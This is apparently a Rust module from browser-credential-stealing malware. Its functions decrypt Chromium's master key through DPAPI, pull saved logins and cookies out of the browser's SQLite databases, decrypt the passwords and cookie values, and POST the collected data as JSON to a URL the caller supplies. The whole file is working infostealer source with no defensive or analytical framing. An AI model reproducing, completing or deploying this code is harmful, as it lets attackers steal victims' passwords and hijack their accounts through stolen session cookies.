use crate::crypto;
use base64::decode;
use reqwest;
use serde_json::json;
use sqlite;

pub fn get_key(key_dir: &std::path::PathBuf) -> Vec<u8> {
    let new_key_dir = key_dir.parent().unwrap().join("key.bak");
    std::fs::copy(key_dir, &new_key_dir).unwrap();
    let obj = std::fs::read_to_string(new_key_dir).unwrap();
    let obj: json::JsonValue = json::parse(&obj).unwrap();
    let res = decode(&obj["os_crypt"]["encrypted_key"].to_string()).unwrap();
    crypto::dpapi_decrypt(res[5..].to_vec())
}

pub fn get_login(login_dir: &std::path::PathBuf, key: &Vec<u8>) -> serde_json::Value {
    let new_login_dir = login_dir.parent().unwrap().join("login.bak");
    std::fs::copy(login_dir, &new_login_dir).unwrap();
    let conn = match sqlite::Connection::open(new_login_dir) {
        Ok(conn_obj) => conn_obj,
        Err(_) => panic!("Error."),
    };
    let mut statement = conn
        .prepare("SELECT action_url, username_value, password_value FROM logins")
        .unwrap();
    let mut credentials = json!({});
    while let sqlite::State::Row = statement.next().unwrap() {
        let url = statement.read::<String>(0).unwrap();
        let username = statement.read::<String>(1).unwrap();
        let password = statement.read::<Vec<u8>>(2).unwrap();
        let obj = json!({
            "url": url,
            "username": username,
            "password": std::str::from_utf8(&crypto::aes_decrypt(&key, password)).unwrap()
        });
        match credentials.get(&url) {
            Some(_) => credentials[&url].as_array_mut().unwrap().push(obj),
            None => {
                credentials[&url] = json!([]);
                credentials[&url].as_array_mut().unwrap().push(obj);
            }
        }
    }
    json!({
        "filename": "login",
        "data": credentials
    })
}

pub fn get_cookies(cookie_dir: &std::path::PathBuf, key: &Vec<u8>) -> serde_json::Value {
    let new_cookie_dir = cookie_dir.parent().unwrap().join("login.bak");
    std::fs::copy(cookie_dir, &new_cookie_dir).unwrap();
    let conn = match sqlite::Connection::open(new_cookie_dir) {
        Ok(conn_obj) => conn_obj,
        Err(_) => panic!("Error."),
    };
    let mut statement = conn
        .prepare("SELECT host_key, name, value, encrypted_value FROM cookies")
        .unwrap();
    let mut cookies = json!({});
    while let sqlite::State::Row = statement.next().unwrap() {
        let url = statement.read::<String>(0).unwrap();
        let name = statement.read::<String>(1).unwrap();
        let encrypted = statement.read::<Vec<u8>>(3).unwrap();
        let obj = json!({
            "domain": url,
            "name": name,
            "value": std::str::from_utf8(&crypto::aes_decrypt(&key, encrypted)).unwrap()
        });
        match cookies.get(&url) {
            Some(_) => cookies[&url].as_array_mut().unwrap().push(obj),
            None => {
                cookies[&url] = json!([]);
                cookies[&url].as_array_mut().unwrap().push(obj);
            }
        }
    }
    json!({
        "filename": "cookies",
        "data": cookies
    })
}

pub fn send_data(data: serde_json::Value, url: &str) -> () {
    let client = reqwest::blocking::Client::new();
    let url: reqwest::Url = url.parse().unwrap();
    match client.post(url).json(&data).send() {
        Ok(_) => 0,
        Err(_) => 1,
    };
}
